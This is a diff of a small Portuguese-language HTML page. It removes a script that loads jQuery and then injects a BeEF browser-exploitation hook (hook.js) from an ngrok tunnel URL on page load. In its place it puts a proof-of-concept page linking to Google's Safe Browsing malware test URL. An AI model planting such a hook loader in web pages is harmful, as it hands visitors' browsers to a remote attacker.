@@ -1,39 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Teste de Link Malicioso</title>
 </head>
 <body>
-    <h1>oi</h1>
-    <script>
-        // Opção 1: Usar jQuery via CDN (recomendado)
-        const jqueryScript = document.createElement("script");
-        jqueryScript.src = "https://code.jquery.com/jquery-1.12.4.min.js";
-        jqueryScript.type = "text/javascript";
-        jqueryScript.onload = () => console.log("jQuery carregado!");
-        jqueryScript.onerror = () => console.error("Erro ao carregar jQuery.");
-        document.head.appendChild(jqueryScript);
-
-        // Após o jQuery, carrega o hook.js via HTTPS
-        const beefHookUrl = "https://b6df8c15dea6.ngrok-free.app/hook.js"; // Substitua pelo URL HTTPS real (ngrok ou Vercel)
-
-        function loadBeefHook(url) {
-            if (!url.startsWith("https://")) {
-                console.error("URL deve usar HTTPS: ", url);
-                return;
-            }
-            const script = document.createElement("script");
-            script.src = url;
-            script.type = "text/javascript";
-            script.onload = () => console.log("BeEF hook carregado!");
-            script.onerror = () => console.error("Erro ao carregar o BeEF hook: ", url);
-            document.head.appendChild(script);
-        }
-
-        // Aguarda o jQuery carregar antes de carregar o hook
-        jqueryScript.onload = () => loadBeefHook(beefHookUrl);
-    </script>
+    <h1>Prova de conceito - teste de link bloqueado</h1>
+    <p>Clique no link abaixo para simular a detecção de link malicioso:</p>
+    <a href="http://testsafebrowsing.appspot.com/s/malware.html" target="_blank">
+        Teste de link malicioso
+    </a>
+    <p>Este link é seguro para teste, fornecido pelo Google apenas para verificar filtros de segurança.</p>
 </body>
 </html>
